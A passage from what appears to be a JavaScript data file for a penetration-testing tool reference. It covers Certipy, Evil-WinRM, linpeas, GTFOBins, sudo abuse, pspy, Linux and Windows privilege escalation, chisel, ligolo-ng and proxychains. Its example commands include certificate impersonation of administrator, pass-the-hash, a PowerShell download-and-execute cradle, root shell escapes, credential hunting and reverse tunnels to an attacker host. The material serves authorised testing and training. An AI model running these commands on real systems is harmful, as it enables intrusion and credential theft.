    {f:'req -ca CA -template T -upn admin@domain', d:'Request a certificate impersonating a user (ESC1: template allows a SAN where it should not).'},
    {f:'auth -pfx file.pfx -dc-ip DC', d:'Authenticate with the obtained certificate and get a TGT (and a hash, if the account has one).'},
    {f:'shadow auto', d:'ESC8/ESC9/ESC10 abuse chain — account takeover via certificate shadow credentials.'},
    {f:'relay -target http://CA/certsrv/certfnsh.asp', d:'Relay NTLM authentication to the CA\'s HTTP endpoint (ESC8) and get a DC certificate. Often the whole engagement.'},
    {f:'-dc-host / -ns / -target', d:'Target specification; -ns matters as always with AD DNS.'},
    {f:'account update / ca', d:'Object manipulation and CA-side operations. Use with care.'}
  ],
  examples:[
    { cmd:`certipy-ad find -u user@zoth.local -p 'P@ss' -dc-ip 10.10.10.10 -vulnerable -stdout`, note:'The first command on any AD engagement. If AD CS is deployed, this is where the win is.' },
    { cmd:`certipy-ad req -u user@zoth.local -p 'P@ss' -ca 'ZOTH-CA' -template 'VulnerableTemplate' -upn administrator@zoth.local -dc-ip 10.10.10.10`, note:'ESC1 abuse: get a certificate that authenticates as administrator.' },
    { cmd:`certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10`, note:'Exchange the certificate for a TGT and the account\'s NT hash.' },
    { cmd:`certipy-ad relay -target http://10.10.10.10/certsrv/certfnsh.asp -ca 'ZOTH-CA' -template 'DomainController'`, note:'ESC8: NTLM relay to the CA over HTTP. Combine with a coerced authentication (PetitPotam/PrinterBug).' }
  ],
  opsec:['Obtaining a certificate for a domain admin is an act of impersonation on a live PKI. It creates a certificate that exists until it expires or is revoked — a persistent artefact on the client\'s infrastructure that you must report and the client must revoke.','The NTLM relay to AD CS via HTTP (ESC8) is one of the highest-impact, most-repeated real-world attack paths. Verify explicitly in writing whether certificate abuse is in scope.'],
  tips:['Read the original AD CS research (SpecterOps "Certified Pre-Owned") once. It explains ESC1-ESC11 precisely, and understanding the underlying misconfiguration matters far more than memorising flags.','If AD CS is deployed and you did not run certipy, you have probably missed the intended path. It is now a standard part of every AD engagement.'],
  links:[{t:'Certipy on GitHub', u:'https://github.com/ly4k/Certipy'},{t:'Certified Pre-Owned (the paper)', u:'https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf'}],
  related:['t-impacket','t-bloodhound','t-netexec'] },

{ id:'t-evilwinrm', name:'Evil-WinRM', kind:'tool', phases:['POST','AD'],
  pkg:'gem install evil-winrm / preinstalled', tagline:'A proper interactive PowerShell shell over WinRM. The pleasant way to operate on Windows.',
  what:'Gives you an interactive, feature-rich PowerShell session over WinRM (port 5985/5986): upload and download files, load .NET assemblies and PowerShell scripts into memory, and run them without touching disk. It is the most convenient interactive Windows shell available from Linux.',
  syntax:'evil-winrm -i TARGET -u USER -p \'PASS\'\nevil-winrm -i TARGET -u USER -H NTHASH\nevil-winrm -i TARGET -u USER -c cert.pem -k key.pem -S',
  flags:[
    {f:'-i / -P', d:'Target IP/hostname and port (5985 HTTP default, 5986 HTTPS).'},
    {f:'-u / -p / -H', d:'Username, password, or NT hash for pass-the-hash.'},
    {f:'-c / -k', d:'Certificate and private key. Combine with a certificate obtained via AD CS — the cleanest authentication path.'},
    {f:'-S / --ssl', d:'HTTPS on 5986.'},
    {f:'-r / --realm', d:'Kerberos realm: authenticate with a ticket instead of a password.'},
    {f:'upload / download', d:'Built-in transfer commands inside the session.'},
    {f:'-s SCRIPTDIR', d:'Directory of PowerShell scripts offered via a menu on connect.'},
    {f:'-e EXEDIR', d:'Directory of .NET binaries (like Seatbelt) offered for in-memory loading via Invoke-Binary.'}
  ],
  examples:[
    { cmd:`evil-winrm -i 10.10.10.20 -u user -p 'P@ss'`, note:'Basic interactive session. Prefer this over psexec: no service creation, minimal artefacts.' },
    { cmd:`evil-winrm -i 10.10.10.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`, note:'Pass-the-hash session. Give both halves; the LM half is usually the empty constant.' },
    { cmd:`evil-winrm -i 10.10.10.20 -c administrator.pem -k administrator.key`, note:'Certificate authentication after AD CS abuse. No password, no hash, and often survives a password reset.' },
    { cmd:`mkdir -p ~/tools/{scripts,binaries} && evil-winrm -i 10.10.10.20 -u user -p 'P@ss' -s ~/tools/scripts -e ~/tools/binaries`, note:'Populate your toolkit directories once; every session then offers them as a menu.' }
  ],
  opsec:['WinRM is normally only reachable from management networks. If you can reach 5985 from a compromised host, that is itself worth reporting as a segmentation gap.','Loading tools reflectively (Invoke-Binary, Invoke-Mimikatz) is memory-only and leaves far less on disk than uploading and executing — but modern EDR catches the well-known ones by name.'],
  tips:['Keep ~/tools/scripts stocked with the reliable helpers: PowerView.ps1, SharpHound.ps1, Invoke-Mimikatz.ps1, and Seatbelt. They appear as a numbered menu on connect, which is a big workflow improvement over manual uploads.','If WinRM is closed but SMB is open, use nxc winrm to check, then fall back to wmiexec. If 5985 is open but authentication fails, check whether the account is in Remote Management Users.'],
  links:[{t:'Evil-WinRM on GitHub', u:'https://github.com/Hackplayers/evil-winrm'},{t:'WinRM enumeration (nxc)', u:'https://www.netexec.wiki/'}],
  related:['t-netexec','t-impacket','t-bloodhound'] },

{ id:'t-linpeas', name:'linpeas / winPEAS', kind:'tool', phases:['POST'],
  pkg:'download from PEASS-ng releases', tagline:'Automated privilege-escalation enumeration. Instantly useful, and instantly recognisable to defenders.',
  what:'Shell and PowerShell scripts that walk a host looking for privilege-escalation opportunities and print them colour-coded by likelihood. linpeas covers SUID/SGID oddities, capabilities, cron, writable system files, exposed credentials in configs and history, sudo rules, container escapes, and much more.',
  syntax:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\nchmod +x linpeas.sh && ./linpeas.sh -a',
  flags:[
    {f:'-a', d:'All checks: extra time-consuming enumeration plus more thorough searches.'},
    {f:'-q', d:'Quiet, no banner. Better for piping through tee.'},
    {f:'-s / -e', d:'Superfast (no network checks) / excluded checks.'},
    {f:'-P PASSWORD', d:'Sudo password, so it can enumerate more with sudo.'},
    {f:'-o / -N', d:'Output file / no colour codes (essential when saving or transferring output).'},
    {f:'-d / -p / -t', d:'Fast mode, don\'t check PATH, network scan timeout.'},
    {f:'Download without touching disk', d:'curl -L URL | sh — runs entirely in memory, leaving nothing in the filesystem.'},
    {f:'winPEAS variants', d:'winPEASx64.exe (binary) or winPEAS.ps1 (PowerShell). The domain/enumeration variants add AD checks.'}
  ],
  examples:[
    { cmd:`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`, note:'Fastest usable run: no disk write, immediate output.' },
    { cmd:`./linpeas.sh -a -N 2>/dev/null | tee linpeas-out.txt`, note:'Thorough run, no colour, logged to a file you can pull back and read.' },
    { cmd:`./linpeas.sh -a 2>/dev/null | grep -A5 -iE 'SUID|capabilities|cron|password'`, note:'Targeted read: only the sections you actually act on.' },
    { cmd:`# On Windows, in memory`, note:'powershell -ep bypass "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.9/winPEAS.ps1\');Invoke-WinPEAS"' }
  ],
  opsec:['linpeas is one of the most signatured scripts in existence; virtually every EDR rule set includes it. On a monitored host, prefer manual enumeration — read the same things by hand — and accept that automatic enumeration is a detected event.','It is also noisy and slow on a large filesystem. -s limits network checks; exclude directories you know are irrelevant.'],
  tips:['The output is huge. Never try to read it all: run it with tee, then grep for the categories you act on and treat the full file as an appendix.','Automated tools tell you where to look, not what you found. Everything linpeas flags must be manually verified and manually demonstrated before it appears in a report.'],
  links:[{t:'PEASS-ng (linpeas/winPEAS)', u:'https://github.com/peass-ng/PEASS-ng/releases/latest'},{t:'GTFOBins', u:'https://gtfobins.github.io/'}],
  related:['t-gtfobins','t-pspy','t-sudo-abuse'] },

{ id:'t-gtfobins', name:'GTFOBins / LOLBAS', kind:'reference', phases:['POST','MASTERY'],
  pkg:'website (no install)', tagline:'Every Unix binary that can be abused to bypass local restrictions — indexed by binary and by technique.',
  what:'A curated list of UNIX binaries that have legitimate privilege-escalation or breakout uses: shell escape, file read/write, upload, command execution, sudo bypass, SUID abuse. Search by function ("I need to read a file as root") or by binary ("what can tar do for me?").',
  syntax:'https://gtfobins.github.io/    # search by binary name or by capability',
  flags:[
    {f:'Functions', d:'Sudo, SUID, SGID, capabilities, limited SUID, shell escape, arbitrary file read/write, upload/download, reverse shell.'},
    {f:'LOLBAS', d:'The Windows equivalent — living-off-the-land binaries (certutil, bitsadmin, mshta, rundll32, and hundreds more).'},
    {f:'Context matters', d:'A binary is only exploitable in a specific context: SUID root, a sudo rule, or a capability flag. GTFOBins tells you which, precisely.'},
    {f:'curl -s gtfobins.github.io | ...', d:'There are clones and offline mirrors; useful when your foothold has no internet.'}
  ],
  examples:[
    { cmd:`sudo -l`, note:'The single most important post-exploitation command on Linux. Every NOPASSWD line is a lead.' },
    { cmd:`getcap -r / 2>/dev/null | grep -v '^/'`, note:'Binaries with capabilities set — often equivalent to SUID root but far less monitored.' },
    { cmd:`find / -perm -4000 -type f 2>/dev/null`, note:'Every SUID binary. Cross-reference this list against GTFOBins.' },
    { cmd:`# Example chain`, note:'sudo -l shows "NOPASSWD: /usr/bin/tar". GTFOBins says: sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh. You are root.' }
  ],
  opsec:['Using a legitimate system binary to escalate is living-off-the-land: it avoids dropping a tool and can blend with normal activity. It is also why defenders monitor for these exact patterns. There is no free lunch, only better trade-offs.'],
  tips:['Memorise the pattern, not the list: sudo/SUID binary + any technique that lets you pass an arbitrary argument (config file, checkpoint action, output file, path override) equals execution. Learn to recognise the shape.'],
  links:[{t:'GTFOBins', u:'https://gtfobins.github.io/'},{t:'LOLBAS', u:'https://lolbas-project.github.io/'}],
  related:['t-linpeas','t-sudo-abuse','t-linux-privesc-doc'] },

{ id:'t-sudo-abuse', name:'sudo abuse', kind:'reference', phases:['POST'],
  pkg:'—', tagline:'Reading sudo -l correctly and turning each rule into a shell.',
  what:'Sudo misconfiguration is the most common Linux privilege-escalation path, and it is entirely readable: sudo -l tells you exactly what you may run as whom. The skill is reading each rule and knowing which argument of that binary gives you code execution.',
  syntax:'sudo -l   →   cross-reference each binary against GTFOBins   →   exploit',
  flags:[
    {f:'NOPASSWD', d:'No password required. The highest-value line in the output.'},
    {f:'(ALL : ALL)', d:'You may run anything as anyone. You are effectively root already.'},
    {f:'Wildcards in rules', d:'/usr/bin/cat /var/log/* — the wildcard can expand to something you control, changing the command.'},
    {f:'Relative paths', d:'A rule with no absolute path can be exploited by controlling PATH.'},
    {f:'Env keep variables', d:'env_keep with LD_PRELOAD or PYTHONPATH is a direct escalation.'},
    {f:'sudo -V / sudo --version', d:'Version matters: CVE-2019-14287 (negative UID) and CVE-2021-3156 (Baron Samedit, heap overflow) are version-specific shells.'},
    {f:'sudoedit', d:'Frequently allows editing a file you should not be able to, or has its own edge cases.'},
    {f:'Python/perl/ruby/awk/less/more/man/vi/tar/zip/find', d:'The classic "obviously a shell" binaries. They appear in sudo rules more often than anyone expects.'}
  ],
  examples:[
    { cmd:`sudo -l 2>&1 | tee sudo-l.txt`, note:'Always the first thing you run after landing. Read every line.' },
    { cmd:`# NOPASSWD: /usr/bin/find →`, note:'sudo find / -exec /bin/sh \\; -quit' },
    { cmd:`# NOPASSWD: /usr/bin/vim →`, note:'sudo vim -c \':!/bin/sh\' -c \':q\'' },
    { cmd:`# NOPASSWD: /bin/systemctl →`, note:'Create a unit that runs your command as root and start it. Or: sudo systemctl edit, then abuse the editor path.' },
    { cmd:`sudo -u root /usr/bin/env /bin/sh`, note:'If any rule allows you to run env as root, this is immediate.' }
  ],
  opsec:['sudo events are logged to auth.log with the full command line. Every escalation you perform is recorded and timestamped — which is exactly what you want for the report, and exactly why you must be in scope.'],
  tips:['The realisation that matters: any binary that can execute a subprocess is a root shell if a sudo rule lets you run it. less, more, man, vi, find, tar, git, awk, python — the list is enormous and memorising a few shapes covers most real hosts.'],
  links:[{t:'GTFOBins: sudo', u:'https://gtfobins.github.io/#+sudo'},{t:'sudo security advisories', u:'https://www.sudo.ws/security/advisories/'}],
  related:['t-gtfobins','t-linpeas','t-linux-privesc-doc'] },

{ id:'t-pspy', name:'pspy', kind:'tool', phases:['POST'],
  pkg:'download from GitHub releases', tagline:'Watch for processes and cron jobs running without root. No filesystem access required.',
  what:'Monitors Linux process creation by polling /proc, so it sees scheduled jobs, CI runners, and admins doing maintenance — including short-lived processes that no other tool catches. Frequently the answer when nothing else makes sense on a box.',
  syntax:'./pspy64 [-p] [-f] [-i INTERVAL]',
  flags:[
    {f:'-p / --print-commands', d:'Also print the full command line of each process. Essential — it shows you exactly what ran and with what arguments.'},
    {f:'-f / --file-event', d:'Also watch filesystem changes in directories where the current user has permission.'},
    {f:'-i INTERVAL', d:'Poll interval in milliseconds. Default 1000; lower is more accurate and more CPU-hungry.'},
    {f:'-d DIR', d:'Directory to watch for file events (with -f).'},
    {f:'-r / -w', d:'Read a directory recursively / watch in "worker" mode.'},
    {f:'No root needed', d:'It works as an unprivileged user, which is precisely why it is so useful.'}
  ],
  examples:[
    { cmd:`./pspy64 -pf -i 1000`, note:'Watch processes and file events. Leave it running for at least one full cron cycle — several minutes.' },
    { cmd:`./pspy64 -p 2>&1 | tee pspy.log`, note:'Logged run while you do other enumeration in parallel.' },
    { cmd:`# Interpretation`, note:'A root cron job running a script from a world-writable or user-writable directory is a direct root shell. So is a backup job writing to a path you control.' }
  ],
  opsec:['pspy is a static Go binary and stable on most kernels, but it is another dropped artefact. Run it from /dev/shm or /tmp and clean up.','It can only see what /proc exposes and is short-lived processes may be missed at high poll intervals.'],
  tips:['The most common finding pspy produces: a root-owned cron job executing a script in a directory the unprivileged user can write to. Then it is a two-line fix: append your payload to that script, wait one cycle, and you are root.'],
  links:[{t:'pspy on GitHub', u:'https://github.com/DominicBreuker/pspy'}],
  related:['t-linpeas','t-gtfobins','t-linux-privesc-doc'] },

{ id:'t-linux-privesc-doc', name:'Linux privilege escalation', kind:'reference', phases:['POST'],
  pkg:'—', tagline:'The systematic checklist: what to read, in what order, and what each finding lets you do.',
  what:'A reference entry rather than a tool. Post-exploitation on Linux is a disciplined sweep of a known set of locations. Do it in order, log everything, and stop when you have root.',
  syntax:'whoami/id → sudo -l → kernel → SUID/caps → cron → services → configs → credentials → containers',
  flags:[
    {f:'Identity', d:'id; whoami; groups; uname -a; cat /etc/os-release. Very old kernel equals public exploit.'},
    {f:'Sudo', d:'sudo -l. Every rule, cross-referenced against GTFOBins. The highest-yield single command.'},
    {f:'SUID/SGID/caps', d:'find / -perm -4000 -o -perm -2000 -type f 2>/dev/null ; getcap -r / 2>/dev/null. Unusual binaries here are the classic win.'},
    {f:'Cron and timers', d:'cat /etc/crontab /etc/cron.*/* 2>/dev/null ; systemctl list-timers. A root job running a writable script is root.'},
    {f:'Services and sockets', d:'ps aux with unusual paths, /etc/systemd/system/, sockets listening on localhost (netstat -tlnp) — internal-only services are often unpatched.'},
    {f:'Credentials in the filesystem', d:'grep -rEi "password|passwd|api[_-]?key|token" /var/www /opt /home /etc 2>/dev/null. Plus history files, .bash_history, config backups, .env files, database configs, unattended scripts.'},
    {f:'Writable sensitive files', d:'/etc/passwd writable, a writable service file, a writable PATH directory, a writable /etc/ld.so.conf.d entry.'},
    {f:'NFS exports', d:'cat /etc/exports — no_root_squash plus a writable mount is an immediate root via a SUID binary.'},
    {f:'Docker/containers', d:'Docker socket access, group membership in docker, privileged containers, mounted host paths, lxc/lxd group.'},
    {f:'Home directory and history', d:'Everything in ~, including hidden directories, keys, tokens, cached credentials, and shell histories that contain the admin\'s commands.'},
    {f:'PATH and environment', d:'A writable directory earlier in PATH than a system binary that a privileged process calls is instant root.'}
  ],
  examples:[
    { cmd:`id; uname -a; cat /etc/os-release; sudo -l 2>&1 | head -30`, note:'The first ten seconds on any Linux box.' },
    { cmd:`find / -perm -4000 -type f 2>/dev/null | tee /dev/shm/suid.txt`, note:'SUID sweep, logged into memory rather than disk where possible.' },
    { cmd:`grep -rEil 'password|secret|token' /var/www /opt /srv 2>/dev/null | head -20`, note:'Config and source code credential hunt.' },
    { cmd:`cat /etc/exports 2>/dev/null; id; ls -la /run/docker.sock 2>/dev/null`, note:'NFS and container escape checks — both frequently missed.' },
    { cmd:`ls -la ~ ~/.ssh ~/.config 2>/dev/null; cat ~/.bash_history 2>/dev/null | head -50`, note:'Home directory and history. Admin passwords end up in histories constantly.' }
  ],
  opsec:['Every command you run may be logged (auditd, bash history with remote logging, EDR process telemetry). This is unavoidable on a monitored host and is why authorisation matters.','Write to /dev/shm rather than /tmp where you have the choice: it is memory-backed and cleaned on reboot.'],
  tips:['Order matters for efficiency: sudo -l and SUID take ten seconds each and resolve the majority of real boxes. Kernel exploits are a last resort — they are the most likely to crash the host, and a crashed production server is a career event.','Document the exact command and output for every escalation step. "We escalated to root" is not a finding; "sudo rule NOPASSWD:/usr/bin/find allowed this exact command" is.'],
  links:[{t:'HackTricks: Linux privesc', u:'https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html'},{t:'PayloadsAllTheThings: privesc', u:'https://github.com/swisskyrepo/PayloadsAllTheThings'}],
  related:['t-linpeas','t-gtfobins','t-pspy','t-sudo-abuse'] },

{ id:'t-windows-privesc-doc', name:'Windows privilege escalation', kind:'reference', phases:['POST','AD'],
  pkg:'—', tagline:'Service permissions, token abuse, credential hunting, and the local-admin-to-SYSTEM ladder.',
  what:'Reference entry. Windows local privilege escalation follows a well-trodden checklist: what can I write, what runs as SYSTEM, what credentials are lying around, and which token can I impersonate.',
  syntax:'whoami /all → services → unquoted paths → tokens → credentials → SYSTEM',
  flags:[
    {f:'whoami /all / /priv', d:'Groups, privileges and integrity level. SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege means a potato attack gives you SYSTEM.'},
    {f:'Service binaries and permissions', d:'icacls on each service path; sc qc and wmic service. A service binary in a directory you can write to, running as SYSTEM, is a direct escalation.'},
    {f:'Unquoted service paths', d:'A path with spaces and no quotes resolves to a directory you may control. wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\\Windows"'},
    {f:'Modifiable service config', d:'sc config SERVICENAME binPath= "your command" — if you can reconfigure a SYSTEM service, you own the box.'},
    {f:'AlwaysInstallElevated', d:'A registry key allowing any user to install an MSI as SYSTEM. reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated. A single .msi and you are SYSTEM.'},
    {f:'Credentials', d:'cmdkey /list, unattend.xml and sysprep files, IIS web.config, registry autologon (reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), KeePass files, browser stores, Group Policy Preferences passwords (gpp_password module).'},
    {f:'Tokens', d:'whoami /priv then a potato variant (GodPotato, JuicyPotato, PrintSpoofer, SweetPotato) for SeImpersonate. Then run as SYSTEM and move to credential extraction.'},
    {f:'Scheduled tasks', d:'schtasks /query /fo LIST /v — a task running as SYSTEM executing a script you can write to.'},
    {f:'DLL hijacking', d:'Procmon (from sysinternals) on a target service, looking for a missing DLL in a writable directory.'},
    {f:'UAC bypass', d:'If you are in the Administrators group but running at medium integrity, a UAC bypass (fodhelper, computerdefaults, eventvwr) gets you high integrity. Worthless if you are not an admin.'}
  ],
  examples:[
    { cmd:`whoami /all; whoami /priv`, note:'Groups, privileges, integrity level. Privileges are the tell: SeImpersonate almost always means SYSTEM.' },
    { cmd:`wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\\Windows"`, note:'Auto-start services outside the Windows directory — your likely escalation targets.' },
    { cmd:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"`, note:'Autologon credentials. Set-and-forgotten and common in labs and thin-client deployments.' },
    { cmd:`# SeImpersonate → SYSTEM`, note:'GodPotato.exe -cmd "cmd /c whoami"  →  NT AUTHORITY\\SYSTEM' },
    { cmd:`nxc smb 10.10.10.20 -u user -p pass -M gpp_password`, note:'Group Preferences passwords: the classic cpassword finding, decrypted instantly.' },
    { cmd:`cmdkey /list`, note:'Saved credentials. Then runas /savecred /user:admin cmd.exe to use them.' }
  ],
  opsec:['Local privilege escalation on Windows means touching services and possibly rebooting the host. A reboot of a production server is an incident, however briefly it lasts.','Sysinternals tool usage is not inherently malicious but is telemetry-heavy and increasingly flagged by EDR heuristics.'],
  tips:['Privileges first, everything else second: if whoami /priv shows SeImpersonate or SeAssignPrimaryToken, reach for a potato and stop reading the rest of the checklist — you already have SYSTEM.','Windows local admin to SYSTEM is not the goal. SYSTEM plus secretsdump is the goal: the difference between "I can be SYSTEM here" and "I have the domain admin hash" is where engagements are won.'],
  links:[{t:'HackTricks: Windows local privesc', u:'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html'},{t:'Seatbelt (host survey)', u:'https://github.com/GhostPack/Seatbelt'}],
  related:['t-linpeas','t-impacket','t-bloodhound'] },

{ id:'t-chisel', name:'chisel', kind:'tool', phases:['POST'],
  pkg:'apt install chisel (or GitHub release)', tagline:'TCP/UDP tunnel over HTTP — one file, no dependencies, SOCKS5 in one command.',
  what:'A single Go binary that you run on both sides: a server on your machine, a client on the doomed host. It multiplexes TCP over a single HTTP or Websocket connection, which means it survives egress filtering that blocks raw TCP. Purpose-built for pivoting through a host that only has HTTP out.',
  syntax:'# attacker\n./chisel server -p 8000 --reverse\n# target\n./chisel client ATTACKER_IP:8000 R:socks',
  flags:[
    {f:'server --reverse', d:'Required on your side for reverse tunnels. Without it the client cannot ask you to listen on its behalf.'},
    {f:'server --socks5 / --auth', d:'Server-side SOCKS5, with optional authentication. Use --auth: you are exposing a tunnel.'},
    {f:'client R:socks', d:'The reverse SOCKS5 proxy. Then proxychains4 or a browser points at 127.0.0.1:1080.'},
    {f:'client R:8080:10.10.20.5:80', d:'Reverse port forward: your localhost:8080 maps to an internal service.'},
    {f:'client R:1080:socks', d:'Explicit form when you want to change the local SOCKS port.'},
    {f:'--fingerprint / --tls', d:'TLS with certificate pinning, so the traffic is not plaintext HTTP.'},
    {f:'client R:9900:socks,remote', d:'Remote-port forwarding in the reverse direction.'}
  ],
  examples:[
    { cmd:`chisel server -p 8000 --reverse --auth user:pass`, note:'Attacker side. Run inside tmux — if it dies, all your tunnels die.' },
    { cmd:`./chisel client 10.10.14.9:8000 R:socks --auth user:pass`, note:'On the doomed host. Instantly gives you SOCKS5 on 127.0.0.1:1080.' },
    { cmd:`proxychains4 -q nxc smb 10.10.20.0/24 -u user -p pass`, note:'Scan the internal network through the tunnel.' },
    { cmd:`./chisel client 10.10.14.9:8000 R:5900:10.10.20.9:3389`, note:'Direct RDP to an internal host through your localhost:5900.' }
  ],
  opsec:['Chisel traffic is HTTP or Websocket, so it blends with normal egress — that is its purpose and its limitation. Intrusion detection systems increasingly fingerprint chisel\'s specific protocol shape, so it is not invisible.','Always use --auth. An open chisel server on your machine is an unauthenticated proxy into the client\'s network.'],
  tips:['One tunnel, all protocols: R:socks plus proxychains covers scanning, SMB, RDP, LDAP and HTTP without a single additional tunnel. Reach for chisel as your first pivot and only escalate to something heavier if it fails.','Run chisel (and socat, and ligolo) inside tmux. Losing the tunnel mid-lateral-movement is entirely avoidable.'],
  links:[{t:'chisel on GitHub', u:'https://github.com/jpillora/chisel'},{t:'Pivoting (HackTricks)', u:'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html'}],
  related:['t-ligolo','t-proxychains','t-socat','t-ssh'] },

{ id:'t-ligolo', name:'ligolo-ng', kind:'tool', phases:['POST','AD'],
  pkg:'download from GitHub releases', tagline:'A proper Layer-3 tunnel: real routes instead of SOCKS. No proxychains, full-speed scanning, UDP support.',
  what:'Unlike SOCKS-based pivoting, ligolo-ng creates a TUN interface and routes actual IP traffic through the agent. The practical result: nmap runs at full speed with -sS, UDP works, and internal subnet tools behave normally because there is a real network route rather than a proxy. It is the modern standard for network pivoting.',
  syntax:'attacker: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert   →  agent: ./agent -connect 10.10.14.9:11601 -ignore-cert',
  flags:[
    {f:'proxy -selfcert', d:'The listener on your machine, with a self-signed certificate.'},
    {f:'agent -connect -ignore-cert', d:'The agent on the foothold, connecting back to you.'},
    {f:'session → start', d:'Once the agent appears in the proxy session list, `start` brings the tunnel up.'},
    {f:'ifconfig', d:'In the proxy console: lists interfaces on the agent host. This reveals the internal networks.'},
    {f:'authorizer', d:'Interactive prompt to approve new agents — a safety control worth enabling.'},
    {f:'listener_add', d:'Bind a port on the agent host and forward to wherever you like — the reverse direction.'},
    {f:'ip route add', d:'Add a route through the ligolo interface for the internal subnet: sudo ip route add 10.10.20.0/24 dev ligolo.'},
    {f:'-ignore-cert / -accept-fingerprint', d:'Certificate handling for repeated use.'}
  ],
  examples:[
    { cmd:`sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert`, note:'The three commands that set up the attacker side. Run the proxy in tmux.' },
    { cmd:`./agent -connect 10.10.14.9:11601 -ignore-cert`, note:'On the foothold. On a Linux target you may need to chmod +x it.' },
    { cmd:`sudo ip route add 10.10.20.0/24 dev ligolo`, note:'After `start` in the proxy console, add the route. Now nmap and every other tool reaches the internal network natively.' },
    { cmd:`sudo nmap -sS -p- --min-rate 3000 10.10.20.5`, note:'Full-speed internal scanning with SYN scans. This is what SOCKS cannot give you.' },
    { cmd:`listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001`, note:'Reverse listener: expose your file server through the agent to the whole internal network.' }
  ],
  opsec:['A TUN interface on your own machine and a route into the client\'s network means every tool you run reaches the internal network. That is exactly the risk: no SOCKS proxy restricts you, so scope discipline is now entirely your own responsibility.','It requires root on the attacker side (to create the TUN device) and often root on the target to be fully functional.','Newer versions added an authorizer prompt; without it, anyone who can reach your proxy port can connect an agent.'],
  tips:['This is the tool that makes proxychains feel obsolete: no -sT-only limitation, no per-connection overhead, and UDP works. On any engagement with an internal network segment, ligolo-ng is the modern default.','Combine with responder, nmap -sS and nxc at normal speed. The difference from a SOCKS chain is genuinely dramatic.'],
  links:[{t:'ligolo-ng on GitHub', u:'https://github.com/nicocha30/ligolo-ng'},{t:'ligolo-ng wiki', u:'https://docs.ligolo.ng/'}],
  related:['t-chisel','t-proxychains','t-socat','t-ssh'] },

{ id:'t-proxychains', name:'proxychains-ng', kind:'tool', phases:['POST'],
  pkg:'apt install proxychains4', tagline:'Force any tool through a SOCKS proxy — SOCKS5 for TCP only, connect scans only, and everything slow.',
  what:'Intercepts a program\'s network calls via LD_PRELOAD and routes TCP through one or more proxies. It is how you use tools that have no proxy option at all (hydra, nxc over odd protocols) through a pivot. The limits are hard and worth knowing: TCP only, so no UDP scanning, and nmap must use -sT (and ideally -Pn -n).',
  syntax:'proxychains4 -q nmap -sT -Pn -p 445 10.10.10.5\nproxychains4 -q nxc smb TARGET -u USER -p \'PASS\'',
  flags:[
    {f:'-q', d:'Quiet: no proxychain banners. Use always in pipelines (they corrupt tool output otherwise).'},
    {f:'-f FILE', d:'Use a specific config file. Better than editing /etc/proxychains4.conf for every engagement.'},
    {f:'socks5 127.0.0.1 1080', d:'The proxy line in the config file. Add several for a chain.'},
    {f:'strict_chain / dynamic_chain', d:'Strict requires all proxies up; dynamic tolerates dead ones. Use dynamic for multi-hop.'},
    {f:'proxy_dns', d:'Also route DNS through the proxy. Important for AD domains where internal names resolve only via the internal DC.'},
    {f:'nmap -sT -Pn -n', d:'The required flags. -sS cannot be proxied — it sends raw packets.'},
    {f:'Timeouts', d:'tcp_read_time_out and tcp_connect_time_out. Raise them for slow pivots; lower them to fail fast.'},
    {f:'Logging', d:'proxychains4 -q ... 2>&1 | tee — the tool\'s own output, but the proxychains layer itself prints nothing useful.'}
  ],
  examples:[
    { cmd:`ssh -D 1080 -N -f user@10.10.10.5`, note:'Set up a SOCKS proxy first (or use chisel R:socks). Then point proxychains at 127.0.0.1:1080.' },
    { cmd:`proxychains4 -q nxc smb 10.10.20.0/24 -u user -p pass --shares`, note:'NetExec through the pivot — the most common real use.' },
    { cmd:`proxychains4 -q nmap -sT -Pn -n -p22,80,443,445 10.10.20.5`, note:'Note the flags. -sS through proxychains produces nothing but confusion.' },
    { cmd:`proxychains4 -q hydra -l user -p pass -t 2 ssh://10.10.20.5`, note:'Single-threaded-ish scanning through the pivot to avoid overwhelming it.' },
    { cmd:`proxychains4 -q curl -v http://10.10.20.5/`, note:'What proxychains does to a normal command. This is your connectivity smoke test.' }
  ],
  opsec:['Every proxied connection is slow and adds latency. Reduce thread counts — a proxychained brute force against a service behind a pivot is a self-inflicted denial of service.','Without proxy_dns enabled, internal hostnames will not resolve and the tool will appear broken. That one line causes most proxychains frustration.'],
  tips:['The classic mistake: wondering why nmap through proxychains finds nothing, and discovering you used -sS. It must be -sT. Every time.','If proxychains feels like the wrong shape for a whole engagement, it is — use ligolo-ng for layer-3 routing and keep proxychains for the single tool that has no other option.'],
  links:[{t:'proxychains-ng', u:'https://github.com/rofl0r/proxychains-ng'}],
  related:['t-chisel','t-ligolo','t-socat','t-ssh'] },

{ id:'t-socat', name:'socat', kind:'tool', phases:['POST','MASTERY'],
  pkg:'apt install socat', tagline:'The bidirectional relay that does things netcat cannot: full-scale port forwarding, PTY shells, and file/socket bridging.',
  what:'SOcket CAT. Connects any two things: TCP, UDP, files, PTYs, Unix sockets, exec\'d commands. For pentesting its headline feature is a fully interactive TTY shell (essential when you land a dumb reverse shell and need tab completion, sudo and ssh to work) and simple port relays for pivoting.',
